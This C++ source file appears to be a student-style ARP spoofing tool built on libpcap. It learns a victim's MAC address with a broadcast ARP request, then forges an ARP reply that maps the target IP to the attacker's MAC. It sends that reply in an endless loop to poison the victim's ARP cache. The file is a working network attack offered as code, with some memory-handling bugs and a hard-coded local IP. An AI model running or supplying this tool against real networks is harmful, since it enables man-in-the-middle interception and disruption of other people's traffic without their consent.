#include "arp_spoofing.h"


bool IsArp(const u_char* packet){
    return (packet[0] == 0x08 && packet[1] == 0x06);
}

bool IsReply(const u_char* packet){
    return (packet[0] == 0x00 && packet[1] == 0x02);
}

bool UCharCmp(const u_char* dest, const u_char* src, const int size){
    for (int i=0;i<size; i++) {
        if(dest[i] != src[i]) return false;
    }
    return true;
}

void arp_spoofing::ExecuteArpSpoofing(){
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(Dev, BUFSIZ, 1, 1000, errbuf);

    Address* Mac = new Address(get_my_mac_address(Dev), ipv4_to_hex("172.20.10.2"));
    RequestPacket = MakeArpPacket(Mac);

    while(true){
        pcap_sendpacket(handle, RequestPacket->ToPacket(), 42);
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;

        if (IsArp(&packet[12]) && UCharCmp(&packet[0], &(RequestPacket->ToPacket())[6], MAC_SIZE)){
            if (IsReply(&packet[20])) {
                ReplyPacket = new arp_packet(packet);
                printf("Catch REPLY\n");
                break;
            }
        }
    }

    MakeAttackPacket();
    while(true){
        pcap_sendpacket(handle, AttackPacket->ToPacket(), 42);

    }

    pcap_close(handle);
}

void arp_spoofing::MakeAttackPacket(){
    u_char protocol[2] = {0x08, 0x06};

    ethernet_header* etherh = new ethernet_header(ReplyPacket->GetEthernet()->GetSoruce(),
                                                  RequestPacket->GetEthernet()->GetSoruce(),
                                                  protocol);

    u_char hardType[2] = {0x00, 0x01};
    u_char protType[2] = {0x08, 0x00};
    u_char opcode[2] = {0x00, 0x02};

    Hardware* hard = new Hardware(hardType, 0x06);
    Protocol* prot = new Protocol(protType, 0x04);
    Address* send = new Address(RequestPacket->GetEthernet()->GetSoruce(), TargetIp);
    Address* trag = new Address(ReplyPacket->GetEthernet()->GetSoruce(), SenderIp);

    arp_header* arph = new arp_header(hard, prot, opcode, send, trag);
    AttackPacket = new arp_packet(etherh, arph);
}

arp_packet* arp_spoofing::MakeArpPacket(Address* attacker){
    u_char protocol[2] = {0x08, 0x06};

    ethernet_header* etherh = new ethernet_header(mac_to_hex("ff:ff:ff:ff:ff:ff"),
                                                  attacker->GetMacAddress(),
                                                  protocol);

    u_char hardType[2] = {0x00, 0x01};
    u_char protType[2] = {0x08, 0x00};
    u_char opcode[2] = {0x00, 0x01};

    Hardware* hard = new Hardware(hardType, 0x06);
    Protocol* prot = new Protocol(protType, 0x04);
    Address* send = new Address(attacker->GetMacAddress(), attacker->GetIpAddress());
    Address* trag = new Address(mac_to_hex("00:00:00:00:00:00"), SenderIp);

    arp_header* arph = new arp_header(hard, prot, opcode, send, trag);

    return (new arp_packet(etherh, arph));
}

void arp_spoofing::GetTargetMac(){
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(Dev, BUFSIZ, 1, 1000, errbuf);

    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s: %s\n", Dev, errbuf);
        return;
    }


    /*
    while(true){
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) break;

    }
    */
    pcap_close(handle);
}

arp_spoofing::arp_spoofing(){
    SenderIp = new u_char[IP_SIZE];
    TargetIp = new u_char[IP_SIZE];
    RequestPacket = new arp_packet();
    ReplyPacket = new arp_packet();
    AttackPacket = new arp_packet();
}
arp_spoofing::~arp_spoofing(){
    delete[] SenderIp;
    delete[] TargetIp;
    delete Dev;
    delete RequestPacket;
    delete ReplyPacket;
    delete AttackPacket;
}
arp_spoofing::arp_spoofing(const char* dev, const char* sender, char* target){
    SenderIp = new u_char[IP_SIZE];
    TargetIp = new u_char[IP_SIZE];
    Dev = new char[strlen(dev) + 1];
    strcpy(Dev, dev);
    RequestPacket = new arp_packet();
    ReplyPacket = new arp_packet();
    AttackPacket = new arp_packet();

    SenderIp = ipv4_to_hex(sender);
    TargetIp = ipv4_to_hex(target);
}
arp_spoofing::arp_spoofing(const char* dev, u_char* sender, u_char* target,
                           struct arp_packet* request, struct arp_packet* reply, struct arp_packet* attack){
    SenderIp = new u_char[IP_SIZE];
    TargetIp = new u_char[IP_SIZE];
    strcpy(Dev, dev);
    memcpy(SenderIp, sender, IP_SIZE);
    memcpy(TargetIp, target, IP_SIZE);
    RequestPacket = new arp_packet(request->GetEthernet(), request->GetArp());
    ReplyPacket = new arp_packet(reply->GetEthernet(), reply->GetArp());
    AttackPacket = new arp_packet(attack->GetEthernet(), attack->GetArp());
}
u_char* arp_spoofing::GetSenderIp(){
    return SenderIp;
}
u_char* arp_spoofing::GetTargetIp(){
    return TargetIp;
}
